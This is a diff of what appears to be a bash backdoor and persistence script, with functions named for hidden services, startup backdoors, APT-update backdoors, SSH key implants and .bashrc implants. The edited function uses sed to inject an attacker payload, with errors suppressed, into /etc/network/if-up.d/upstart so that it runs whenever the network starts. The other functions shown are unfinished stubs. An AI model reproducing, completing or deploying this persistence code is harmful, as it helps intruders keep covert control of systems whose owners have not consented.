@@ -128,8 +128,7 @@ function hidden_service {
 
 # Not finished!
 function backdoor_startup_service {
-    $PAYLOAD="$PAYLOAD 2>dev/null"
-    sed -i -e "4i\$PAYLOAD /etc/network/if-up.d/upstart"
+    sed -i -e "4i\$PAYLOAD 2>dev/null" /etc/network/if-up.d/upstart
 }
 
 
@@ -139,13 +138,13 @@ function backdoor_apt_update {
 
 }
 
-
+# Not finished!
 function add_sshkey {
     #KEY=$(wget -o key.pem...)
     echo "LOL"
 }
 
-
+# Not finished!
 function add_bashrc{
     echo "LOL"
 }
